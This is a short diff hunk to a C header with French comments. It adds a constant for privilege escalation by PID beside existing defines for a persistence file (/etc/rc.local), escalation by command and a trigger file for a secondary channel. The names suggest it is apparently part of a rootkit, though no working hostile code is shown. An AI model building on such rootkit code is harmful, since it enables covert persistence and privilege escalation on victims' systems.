@@ -59,6 +59,7 @@
 #define PERSIST_FILE "/etc/rc.local"
 
 /* Types de privilèges */
+#define RK_PRIVESC_BY_PID  0
 #define RK_PRIVESC_BY_CMD  1
 
 /* chemin du fichier trigger pour le canal de comm secondaire */
